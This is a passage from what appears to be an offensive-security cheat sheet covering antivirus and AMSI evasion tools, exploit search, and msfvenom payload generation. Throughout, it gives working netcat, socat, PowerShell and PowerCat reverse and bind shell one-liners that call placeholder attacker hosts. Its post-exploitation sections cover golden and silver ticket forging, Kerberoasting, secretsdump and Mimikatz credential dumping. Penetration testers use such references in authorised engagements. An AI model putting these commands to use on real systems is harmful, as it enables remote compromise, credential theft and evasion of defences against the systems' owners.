        <b>Need Specific UUID? (permissions to edit passwd and create user needed) Example: NFS Share mounted on Host with UUID 1014</b>

        ```
        sudo adduser USER && sudo sed -i -e 's/1001/1014/g' /etc/passwd && su USER
        ```
        
        <li><b>-i</b>&ensp;--&ensp;Replace file in place</li>
        <li><b>-e</b>&ensp;--&ensp;Execute Script</li>
        <br></br>
   </details>
        

    <details>
    <summary>Bypassing AV</summary>

    + <details>
        <summary>Veil Framework</summary>

        + 
            <br></br>
            <b>Install on Kali</b>

            ```
            apt install veil
            ```
            ```
            /usr/share/veil/config/setup.sh --force --silent  
            ```

            <b>Reference</b>
            ```
            https://github.com/Veil-Framework/Veil
            ```

            <br></br>
        </details>

        <details>
        <summary>Shellter</summary>

        + 
            <br></br>
            <b>Source</b>

            ```
            https://www.shellterproject.com/download/
            ```

            <b>Install on Kali</b>

            ```
            apt install shellter
            ```

            <br></br>
        </details>

        <details>
        <summary>Sharpshooter</summary>

        + 
            <br></br>
            <b>Javascript Payload Stageless</b>

            ```
            SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
            ```

            <b>Stageless HTA Payload:</b>

            ```
            SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
            ```

            <b>Staged VBS</b>

            ```
            SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
            ```

            <b>Reference</b>

            ```
            https://github.com/mdsecactivebreach/SharpShooter
            ```

            <br></br>
        </details>

        <details>
        <summary>Donut</summary>

        + 
            <br></br>
            <b>Source</b>

            ```
            https://github.com/TheWover/donut
            ```

            <br></br>
        </details>

        <details>
        <summary>Vulcan</summary>

        + 
            <br></br>
            <b>Source</b>

            ```
            https://github.com/praetorian-code/vulcan
            ```

            <br></br>
        </details>

        <details>
        <summary>Scarecrow</summary>

        + 
            <br></br>
            <b>Source</b>

            ```
            https://github.com/optiv/ScareCrow
            ```

            <br></br>
            <b>Install/Run on Kali</b>

            ```
            sudo apt install golang
            ```
            ```
            go get github.com/fatih/color
            ```
            ```
            go get github.com/yeka/zip
            ```
            ```
            go get github.com/josephspurrier/goversioninfo
            ```
            ```
            go build ScareCrow.go
            ```
            ```
            ./ScareCrow
            ```

            <br></br>
        </details>
    </details>

    <details>
    <summary>SearchSploit</summary>
        
    + 
        <br></br>
        <b>Installing (Already in Kali)</b> 

        ```
        apt update && apt install exploitdb
        ```

        <b>Install binsploits</b>
        <br>Note: bin-sploits contains a set of compiled binaries that are tied to exploits in the exploitdb database. Installing this package will take some time depending on your network connection.<br>

        ```
        apt update && apt install exploitdb-bin-sploits
        ```

        <b>Update SearchSploit</b>

        ```
        searchsploit -u
        ```

        <b>Basic Search</b>

        ```
        searchsploit <version #> etc
        ```
        ```
        searchsploit -t php windows
        ```

        <b>Exclude Unwanted Results</b>

        ```
        searchsploit linux kernel 5.2 --exclude="Poc"
        ```

        <b>View exploits from Searchsploit</b>

        ```
        searchsploit 9542 --examine
        ```
        ```
        searchsploit -x window/remote/42031.py
        ```

        <b>Copy exploit to current working directory</b>

        ```
        searchsploit -m
        ```
        
        <b>Access Exploits from Exploit-DB website</b>

        ```
        searchsploit vsftpd 2.3.4 -w
        ```
        
        <b>Run an nmap scan result through searchsploit</b>

        ```
        Nmap -Pn 172.21.0.0 -oX results.xml
        ```
        ```
        searchsploit -x --nmap results.xml
        ```
        
        <b>References</b>

        ```
        https://www.exploit-db.com/documentation/Offsec-SearchSploit.pdf
        ```

        <br></br>
    </details>

    <details>
    <summary>Msfvenom</summary>

    + 
        <br></br>
        <b>List Payloads</b>

        ```
        msfvenom -l payloads
        ```

        <b>View Payload Options</b>

        ```
        msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options
        ```

        <b>Creating a Payload</b>

        ```
        msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport]
        ```

        <b>Creating a payload with encoding</b>

        ```
        msfvenom -p [payload] -e [encoder] -f [formattype] -i [iteration] <var=value> > outputfile
        ```

        <b>Creating a payload using a template</b>

        ```
        msfvenom -p [payload] <var=value> -x [template] -f [formattype] > outputfile
        ```

        <b>Listening for MSfvenom Payloads (from msframework)</b>

        ```
        use exploit/multi/handler
        ```
        ```  
        set payload windows/meterpreter/reverse_tcp  
        ```
        ```
        set lhost <IP>  
        ```
        ```
        set lport <PORT>
        ```
        ```
        set ExitOnSession false
        ```
        ```
        exploit -j
        ```

        <b>Windows Payloads</b>

        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
        ```
        ```
        msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
        ```
        ```
        msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe
        ```
        ```
        msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
        ```
        ```
        msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
        ```
        
        <b> Add a user in windows with msfvenom</b>
        
        ```
        msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
        ```
        
        <b>Linux Payloads</b>

        ```
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
        ```
        ```
        msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
        ```
        ```
        msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
        ```
        ```
        msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
        ```
        
        <b>Web Payloads: PHP</b>

        ```
        msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php
        ```
        ```
        cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
        ```
        
        <b>Web Payloads: ASP</b>

        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
        ```
        
        <b>Web Payloads: JSP</b>

        ```
        msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
        ```
        
        <b>Web Payloads: WAR</b>

        ```
        msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT=  shell.war
        ```
        
        <b>Scripting Payloads: Python</b>

        ```
        msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
        ```
        
        <b>Scripting Payloads: Bash</b>

        ```
        msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
        ```
        
        <b>Scripting Payloads: Perl</b>

        ```
        msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
        ```
       
        <b>Creating an Msfvenom Payload with an encoder while removing bad characters</b>

        ```
        msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"
        ```
        
        <b>Resources</b>

        ```
        https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/
        ```

        <br></br>
    </details>

    <details>
    <summary>Bypass Windows Amsi</summary>

    + 
        <br></br>
        <b>Testing for Amsi Bypass</b>

        ```
        https://github.com/rasta-mouse/AmsiScanBufferBypass
        ```

        <b>Amsi-Bypass-Powershell</b>

        ```
        https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
        ```

        <b>Resources</b>

        ```
        https://blog.f-secure.com/hunting-for-amsi-bypasses/
        ```
        ```
        https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
        ```
        ```
        https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
        ```
        ```
        https://slaeryan.github.io/posts/falcon-zero-alpha.html
        ```

        <br></br>
    </details>

    <details>
    <summary>Netcat Tips</summary>

    + 
        <br></br>
        <b>Connect to Netcat Client</b>

        ```
        rlwrap nc -nv x.x.x.x 4444
        ```

        <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
        <li><b>-v</b>&ensp;--&ensp;Verbose Output</li>

        <br></br>
        <b>Connect to netcat Listener</b>

        ```
        rlwrap nc -nlvp 4444
        ```

        <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
        <li><b>-l</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
        <li><b>-v</b>&ensp;--&ensp;Verbose Output</li>
        <li><b>-p</b>&ensp;--&ensp;Port Number</li>
        <br></br>

        <b>Transfer Files</b>

        ```
        rlwrap nc -nlvp 4444 > incoming.exe
        ```
        ```
        rlwrap nc -nv x.x.x.x 4444 < /Downloads/maliciousfile.exe
        ```

        <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
        <li><b>-l</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
        <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
        <li><b>-v</b>&ensp;--&ensp;Verbose Output</li>
        <br></br>
        
        <b>Backdoor Shells: Linux</b>

        ```
        rlwrap nc x.x.x.x -e /bin/sh
        ```
        ```
        rlwrap nc x.x.x.x -e /bin/bash
        ```
        ```
        rlwrap nc x.x.x.x -e /bin/zsh
        ```
        ```
        rlwrap nc x.x.x.x -e /bin/ash
        ```

        <li><b>-e</b>&ensp;--&ensp;Binds Port to Application</li>
        <br></br>

        <b>Backdoor Shells: Windows</b>

        ```
        rlwrap nc -lv 4444 -e cmd.ex
        ```

        <li><b>-e</b>&ensp;--&ensp;Binds Port to Application</li>
        <br></br>

        <b>Linux netcat reverse shell</b>

        ```
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 4444 >/tmp/f
        ```

        <br></br>
    </details> 

    <details>
    <summary>Socat Tips</summary>

    + 
        <br></br>
        <b>Connect to Socat Client</b>

        ```
        rlwrap socat - TCP4:x.x.x.x:4444
        ```

        <li><b>-</b>&ensp;--&ensp;Transfer Data</li>
        <li><b>TCP4</b>&ensp;--&ensp;Use IPv4 Protocol</li>
        
        <br></br>

        <b>Connect to Encrypted Client</b>

        ```
         rlwrap socat - OPENSSL:x.x.x.x:4444,verify=0

        ```
        
        <li><b>-</b>&ensp;--&ensp;Transfer Data</li>
        <li><b>OPENSSL</b>&ensp;--&ensp;Use Encrypted Protocol</li>
        <li><b>verify=0</b>&ensp;--&ensp;Disable SSL Verification</li>
        
        <br></br>
        <br></br>
        
        <b>Connect to Socat Listener</b>

        ```
        rlwrap sudo socat -d -d TCP4-LISTEN:4444 STDOUT
        ```
        
        <li><b>-d</b>&ensp;--&ensp;Verbose Output</li>
        <li><b>TCP4</b>&ensp;--&ensp;Use IPv4 Protocol</li>
        <li><b>-LISTEN</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
        <li><b>STDOUT</b>&ensp;--&ensp;</li>
        
        <br></br>
        <br></br>

        <b>Transfer Files</b>

        ```
        rlwrap sudo socat TCP4-LISTEN:4444,fork file:secret_passwords.txt
        ```
        ```
        rlwrap socat TCP4:x.x.x.x:4444 file:received_secret_passwords.txt,create
        ```
        
        <li><b>TCP4</b>&ensp;--&ensp;Use IPv4 Protocol</li>
        <li><b>-LISTEN</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
        <li><b>fork</b>&ensp;--&ensp;Spawn Child Process After Connection</li>
        <li><b>file</b>&ensp;--&ensp;Add File Name to be Generated</li>
        <li><b>create</b>&ensp;--&ensp;</li>

        <br></br>
        
        <b>Backdoor Shells: Linux</b>

        ```
        rlwrap socat TCP4:x.x.x.x:4444 EXEC:/bin/sh
        ```
        ```
        rlwrap socat TCP4:x.x.x.x:4444 EXEC:/bin/bash
        ```
        ```
        rlwrap socat TCP4:x.x.x.x:4444 EXEC:/bin/zsh
        ```
        ```
        rlwrap socat TCP4:x.x.x.x:4444 EXEC:/bin/ash
        ```
        
        <li><b>TCP4</b>&ensp;--&ensp;Use IPv4 Protocol</li>
        <li><b>EXEC:</b>&ensp;--&ensp;Execute this Application</li>

        <br></br>

        <b>Backdoor Shells: Windows</b>

        ```
        rlwrap socat TCP4:x.x.x.x:4444 EXEC:'cmd.exe',pipes
        ```
        
        <li><b>TCP4</b>&ensp;--&ensp;Use IPv4 Protocol</li>
        <li><b>EXEC:</b>&ensp;--&ensp;Execute this Application</li>
        <li><b>pipes</b>&ensp;--&ensp;</li>
        
        <br></br>

        <b>Socat Encrypted Bind Shells: OpenSSL Create Self-Signed Certificate</b>

        ```
        openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
        ```

        <li><b>req&ensp;-x509</b>&ensp;--&ensp;Creates Self-Signed Certificates</li>
        <li><b>-newkey</b>&ensp;--&ensp;Generate New Private Key</li>
        <li><b>rsa:2048</b>&ensp;--&ensp;Specify RSA Encryption with 2048 Key length</li>
        <li><b>-nodes</b>&ensp;--&ensp;Store Private Key Unecrypted</li>
        <li><b>-keyout</b>&ensp;--&ensp;Saves Private Key to File</li>
        <li><b>-days</b>&ensp;--&ensp;Validity Period in Days</li>
        <li><b>-out</b>&ensp;--&ensp;Saves Certificate to File</li>
        
        <br></br>
        <br></br>
        
        <b>Socat Encrypted Bind Shells: Convert .key & .cert into .pem</b>

        ```
        cat bind_shell.key bind_shell.crt > bind_shell.pem
        ```

        <b>Socat Encrypted Bind Shells: Create Encrypted Socat Listener on Linux Machine</b>
        
        ```
        rlwrap sudo socat OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
        ```

        <li><b>OPENSSL</b>&ensp;--&ensp;Use Encrypted Protocol</li>
        <li><b>-LISTEN</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
        <li><b>cert</b>&ensp;--&ensp;Specifies Certificate File</li>
        <li><b>verify=0</b>&ensp;--&ensp;Disables SSL Verification</li>
        <li><b>fork</b>&ensp;--&ensp;Spawns Child Process After Connection</li>
        <li><b>EXEC:</b>&ensp;--&ensp;Execute this Application</li>
        
        <br></br>
        <br></br>

        <b>Socat Encrypted Bind Shells: Connect Computer to Bind Shell</b>

        ```
        rlwrap socat - OPENSSL:x.x.x.x:4444,verify=0
        ```

        <li><b>OPENSSL</b>&ensp;--&ensp;Use Encrypted Protocol</li>
        <li><b>verify=0</b>&ensp;--&ensp;Disables SSL Verification</li>

        <br></br>
        <b>Socat Encrypted Bind Shells: Send CMD terminal</b>

        ```
        rlwrap sudo socat OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0,fork STDOUT
        ```
        ```
        socat OPENSSL:x.x.x.x:4444,verify=0 EXEC:'cmd.exe',pipes
        ```
        
        <li><b>OPENSSL</b>&ensp;--&ensp;Use Encrypted Protocol</li>
        <li><b>-LISTEN</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
        <li><b>cert</b>&ensp;--&ensp;Specifies Certificate File</li>
        <li><b>verify=0</b>&ensp;--&ensp;Disables SSL Verification</li>
        <li><b>fork</b>&ensp;--&ensp;Spawns Child Process After Connection</li>
        <li><b>STDOUT</b>&ensp;--&ensp;</li>
        <li><b>EXEC:</b>&ensp;--&ensp;Execute this Application</li>
        <li><b>pipes</b>&ensp;--&ensp;</li>

        <br></br>
    </details> 

    <details>
    <summary>PowerShell Tips</summary>

    + 
      <br></br>
        <b>Change Execution Policy: Unrestricted</b>

        ```
        Set-ExecutionPolicy Unrestricted
        ```

        <br></br>
        <b>Check Current Execution Policy</b>

        ```
        Get-ExecutionPolicy
        ```

        
        <br></br>
        <br></br>
        <b>Connect to  Client</b>

        ```
        nc -nv x.x.x.x 4444
        ```

        <br></br>

        <b>Bind Shell : PowerShell</b>

        ```
        powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
        ```

        <li><b>-c</b>&ensp;--&ensp;Executes Command Between " " as Powershell Prompt</li>
        <li><b>New-Object System.Net.Sockets.TcpListener</b>&ensp;--&ensp;Requires 2 Arguments: Listening IP and Port</li>
        <li><b>$sendback = (iex $data 2>&1 | Out-String )</b>&ensp;--&ensp;Executes Command</li>
        <br></br>
        <br></br>

        <b>Transfer Files: PowerShell</b>

        ```
        powershell -c "(new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/powercat.ps1','C:\Users\USER_NAME\Desktop\powercat.ps1')"
        ```

        <li><b>(-c)</b>&ensp;--&ensp;Executes Command Between " " as Powershell Prompt</li>
        <li><b>(new-object System.Net.WebClient)</b>&ensp;--&ensp;Instantiate either a .Net Framework or COM object</li>
        <li><b>(DownloadFile)</b>&ensp;--&ensp;Public Method of Webclient. Requires Source Location and Target Location </li>
        <br></br>
        
        <b>Reverse Shells: PowerShell</b>

        ```
        powershell -c "$client = New-Object System.Net.Sockets.TCPClient('x.x.x.x',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        ```
        
        <li><b>$client</b>&ensp;--&ensp;Is Assigned the Target IP and Port</li>
        <li><b>$stream</b>&ensp;--&ensp;Adds Network Stream Class to Facilitate Sending and Retrieving Data</li>
        <li><b>[byte[]]$bytes</b>&ensp;--&ensp;Buffer</li>
        <li><b>$sendback = (iex $data 2>&1 | Out-String )</b>&ensp;--&ensp;Runs any String Received as Command</li>
        <li><b>$stream.Write($sendbyte,0$sendbyte.Length</b>&ensp;--&ensp;Results Returned Via Data Steam</li>
        <li><b>$client.Close()</b>&ensp;--&ensp;Closes Connection</li>

        <br></br>
    </details> 

    <details>
    <summary>PowerCat Tips</summary>

    + 
        <br></br>
        <b>Dot-sourcing&ensp;--&ensp;(Loading Script into Session)&ensp;--&ensp;*Needs reloaded each time you start powershell*</b>

        ```
        cd c:\Tools\practical_tools
        ```
        ```
        . .\powercat.ps1
        ```

        <br></br>
        <b>Bind Shell : PowerCat</b>

        ```
        powercat -l -p 4444 -e cmd.exe
        ```

        <li><b>-l</b>&ensp;--&ensp;Listener Mode</li>
        <li><b>-p</b>&ensp;--&ensp;Port</li>
        <li><b>-e</b>&ensp;--&ensp;Application to Execute after Connection</li>
        <br></br>
        <br></br>

        <b>Transfer Files: PowerCat</b>

        ```
        powercat -c x.x.x.x -p 4444 -i C:\Users\USER_NAME\file.ps1
        ```

        <li><b>(-c)</b>&ensp;--&ensp;Client Mode</li>
        <li><b>(-p)</b>&ensp;--&ensp;Port</li>
        <li><b>(-i)</b>&ensp;--&ensp;Local File to be Transfered</li>
        <br></br>
        
        <b>Reverse Shells: PowerCat</b>

        ```
        powercat -c x.x.x.x -p 4444 -e cmd.exe
        ```
        
        
        <li><b>(-c)</b>&ensp;--&ensp;Client Mode</li>
        <li><b>(-p)</b>&ensp;--&ensp;Port</li>
        <li><b>(-e)</b>&ensp;--&ensp;Application to Execute after Connection</li>
        <br></br>
        <br></br>

        <b>Powercat: Stand-Alone Payloads</b>

        ```
        powercat -c x.x.x.x -p 4444 -e cmd.exe -g > reverseshell.ps1
        ```

        <li><b>(-c)</b>&ensp;--&ensp;Client Mode</li>
        <li><b>(-p)</b>&ensp;--&ensp;Port</li>
        <li><b>(-e)</b>&ensp;--&ensp;Application to Execute after Connection</li>
        <li><b>(-g)</b>&ensp;--&ensp;Generate Payload and Redirect output to File</li>
        <br></br>
        <br></br>

        <b>Powercat: Stand-Alone Encoded Payloads</b>

        ```
        powercat -c x.x.x.x -p 4444 -e cmd.exe -ge > encoded_reverseshell.ps1
        ```

        <li><b>(-c)</b>&ensp;--&ensp;Client Mode</li>
        <li><b>(-p)</b>&ensp;--&ensp;Port</li>
        <li><b>(-e)</b>&ensp;--&ensp;Application to Execute after Connection</li>
        <li><b>(-ge)</b>&ensp;--&ensp;Generate Encoded Payload and Redirect output to File</li>
        <br></br>
        <b>Powercat: Stand-Alone Encoded Payloads: Copy Encoded Contents of File</b>

        ```
        notepad ./encoded_reverseshell.ps1
        ```

        <b>Powercat: Stand-Alone Encoded Payloads: Paste Encoded Contents of File</b>

        ```
        powershell -E
        ```

        <li><b>(-E)</b>&ensp;--&ensp;(EncodedCommand) Option</li>
        <br></br>
        <br></br>
    </details> 
</details>

<details>
<summary>Post Exploitation</summary>

+ <details>
    <summary>General Notes</summary>
    
    + <details>
        <summary>Spawn a tty</summary>
        
        + 
            <br></br>
            <b>nc two steps</b>

            ```
            rlwrap nc localhost 80
            ```
            ```
            rlwrap -r -f . nc
            ```
            
            <br></br>

            ```
            socat file:`tty`,raw,echo=0 tcp-listen:12345
            ```
            ```
            /bin/sh -i
            ```
            ```
            /bin/bash -i
            ```
            ```
            python -c 'import pty; pty.spawn("/bin/sh")'
            ```
            ```
            perl -e 'exec "/bin/sh";'
            ```
            ```
            perl: exec "/bin/sh";
            ```
            ```
            ruby: exec "/bin/sh"
            ```
            ```
            lua: os.execute('/bin/sh')
            ```

            <br></br>
        </details>

        <details>
        <summary>Priviledge Escalation Scripts</summary>
        
        + 
            <br></br>
            <b>Windows: Windows Exploit Suggester (Next-Generation)</b>

            ```
            https://github.com/bitsadmin/wesng
            ```
            <b>Windows: Sherlock</b>

            ```
            https://github.com/rasta-mouse/Sherlock
            ```

            <b>Windows: Powersploit</b>

            ```
            https://github.com/PowerShellMafia/PowerSploit
            ```

            <b>Windows: WinPeas</b>

            ```
            https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
            ```

            <b>Windows: PrivescCheck</b>

            ```
            https://github.com/itm4n/PrivescCheck
            ```

            <br></br>
            <b>Linux: Linux Exploit Suggester 2</b>

            ```
            https://github.com/jondonas/linux-exploit-suggester-2
            ```

            <b>Linux: LinEnum</b>

            ```
            https://github.com/rebootuser/LinEnum
            ```

            <b>Linux: UnixPriv Checke</b>

            ```
            https://github.com/pentestmonkey/unix-privesc-check
            ```

            <b>Linux: LinPeas</b>

            ```
            https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
            ```

            <br></br>
        </details>

        <details>
        <summary>Other Resources</summary>
        
        + 
            <br></br>
            <b>PowerSharpPack</b>

            ```
            https://github.com/S3cur3Th1sSh1t/PowerSharpPack
            ```

            <br></br>
            <b>Windows: LOLBAS</b>

            ```
            https://lolbas-project.github.io/#
            ```

            <b>Windows: Windows Privilege Escalation Fundmentals</b>

            ```
            https://www.fuzzysecurity.com/tutorials/16.html
            ```
            
            <b>Windows: SharpSuite</b>

            ```
            https://github.com/FuzzySecurity/Sharp-Suite
            ```

            <b>Windows: Watson</b>

            ```
            https://github.com/rasta-mouse/Watson
            ```

            <b>Windows: WinPwn</b>

            ```
            https://github.com/S3cur3Th1sSh1t/WinPwn
            ```

            <br></br>
            <b>Linux: GTFOBins</b>

            ```
            https://gtfobins.github.io/
            ```

            <b>Linux: g0tmi1k Linux Privilege Escalation</b>

            ```
            https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
            ```

        </details>
    </details>

    <details>
    <summary>C2 Frameworks</summary>

    + <details>
        <summary>Empire C2</summary>

        + 
            <br></br>
            <b>Github</b>

            ```
            https://github.com/BC-SECURITY/Empire
            ```

            <b>Kali Install</b>

            ```
            apt install powershell-empire
            ```

            <b>Manual Install</b>

            ```
            cd /Empire/setup
            ```
            ```
            ./install.sh
            ```

            <b>Setup Listeners from Empire</b>

            ```
            listeners
            ```
            ```
            uselistener
            ```

            <b>Listener Options</b>

            ```
            dbx http http_com http_foreign http_hop http_mapi meterpreter onedrive redirector
            ```

            <br></br>
        </details>

        <details>
        <summary>Covenant</summary>

        + 
            <br></br>
            <b>Source</b>

            ```
            https://github.com/cobbr/Covenant
            ```
            <br></br>
            <b>Install with APT</b>
            
            ```
            sudo apt install covenant-kbx
            ```

            <b>Install Manually</b>
            
            ```
            apt install dotnet-sdk-2.2
            ```
            ```
            git clone --recurse-submodules https://github.com/cobbr/Covenant
            ```
            ```
            cd Covenant/Covenant
            ```
            ```
            dotnet build
            ```
            ```
            dotnet run
            ```
            
            <br></br>
        <details>
    </details>



    <details>
    <summary>Transfering Files</summary>
        
    + 
        <br></br>
        <b>FTP: Install pyftpdlib & pure-ftpd</b>

        ```
        pip3 install pyftpdlib
        ```
        ```
        sudo apt install pure-ftpd
        ```
        ```
        service pure-ftpd start
        ```

        <b>FTP: Run</b>

        ```
        Python3 -m pyftpdlib -p 21 -w
        ```

        <li><b>(-m)</b></li>
        <li><b>(-w)</b> Allow Annonymous Write Access</li>

        <br></br>
        <b>Web</b>

        ```
        Python3 -m http.server 443
        ```
        ```
        service apache2 start
        ```

        <br></br>
        <b>Powershell: Raw (Will get Flagged by AV/AMSI)</b>

        ```
        powershell -c (New-Object Net.WebClient).DownloadFile('http://172.21.0.0:port/file', 'output-file'
        ```
        ```
        powershell -c Invoke-WebRequest -Uri "http://172.21.0.0" -OutFile "C:\path\file"
        ```

        <br></br>
        <b>Powercat: Send Files</b>

        ```
        powercat -c x.x.x.x -p 4444 -i C:\inputfile
        ```

        <b>Powercat: Recieve Files</b>

        ```
        powercat -l -p 4444 -of C:\inputfile
        ```

        <br></br>
        <b>Linux: scp</b>

        ```
        scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2
        ```

        <b>Linux: scp through ssh</b>

        ```
        scp -P 2322 passwords.txt remote_username@172.21.0.2:/remote/directory
        ```

        <b>Linux: scp remote file to local system</b>

        ```
        scp remote_username@172.21.0.2:/remote/file.txt /local/directory
        ```

        <br></br>
        <b>SimpleHTTPServer Upload: Services To Upload from System to Target</b>

        ```
        https://gist.github.com/touilleMan/eb02ea40b93e52604938
        ```
        
        <br></br>
    </details>

    <details>
    <summary>BloodHound</summary>

    + 
        <br></br>
        <b>Install</b>

        ```
        apt install bloodhound
        ```

        <b>Gather Data</b>

        ```
        import-module .\sharphound.ps1
        ```
        ```
        invoke-bloodHound -CollectionMethod All -domain target-domain -LDAPUser username -LDAPPass password
        ```

        <br></br>
        <b>Pre-Compiled Binaries</b>

        ```
        https://github.com/BloodHoundAD/BloodHound/releases
        ```

        <b>SharpHound</b>

        ```
        https://github.com/BloodHoundAD/SharpHound3
        ```

        <b>Source</b>

        ```
        https://github.com/BloodHoundAD/BloodHound
        ```

        <b>Bloodhound for Python 3.0 or Higher</b>

        ```
        https://github.com/fox-it/BloodHound.py
        ```

        <br></br>
    </details>

    <details>
    <summary>Impacket</summary>

    + 
        <br></br>
        <b>Generate Silver Tickets with Impacket</b>

        ```
        python3 ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>
        ```
        ```
        python3 ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>
        ```

        <b>Generate Golden Tickets</b>

        ```
        python3 ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> <user_name>
        ```
        ```
        python3 ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> <user_name>
        ```

        <b>Credential Access with Secretsdump</b>

        ```
        impacket-secretsdump username@target-ip -dc-ip target-ip
        ```


        <br></br>
        <li><b></b></li>
        <br></br>
    </details>

    <details>
    <summary>Rubeus</summary>

    + 
        <br></br>
        <b>ASREProasting: Check for users in Current Domain</b>

        ```
        Rubeus.exe asreproast /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
        ```

        <br></br>
        <b>Kerberoasting:</b>

        ```
        Rubeus.exe kerberoast /outfile:<output_TGSs_file>
        ```
        ```
        Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"SID-VALUE"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
        ```

        <br></br>
        <b>Pass the key (PTK):</b>

        ```
        .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
        ```

        <br></br>
        <b>Using the ticket on a Windows target:</b>

        ```
        Rubeus.exe ptt /ticket:<ticket_kirbi_file>
        ```

        <br></br>
    </details>

    <details>
    <summary>Mimikatz</summary>

    + 
        <br></br>
        <b>Post exploitation commands must be executed from SYSTEM level privileges.</b>

        ```
        mimikatz # privilege::debug
        ```
        ```
        mimikatz # token::whoami
        ```
        ```
        mimikatz # token::elevate
        ```
        ```
        mimikatz # lsadump::sam
        ```
        ```
        mimikatz # sekurlsa::logonpasswords
        ```

        <br></br>
        <b>Pass The Hash</b>

        ```
        mimikatz # sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm_hash
        ```

        <br></br>
        <b>Inject generated TGS key</b>

        ```
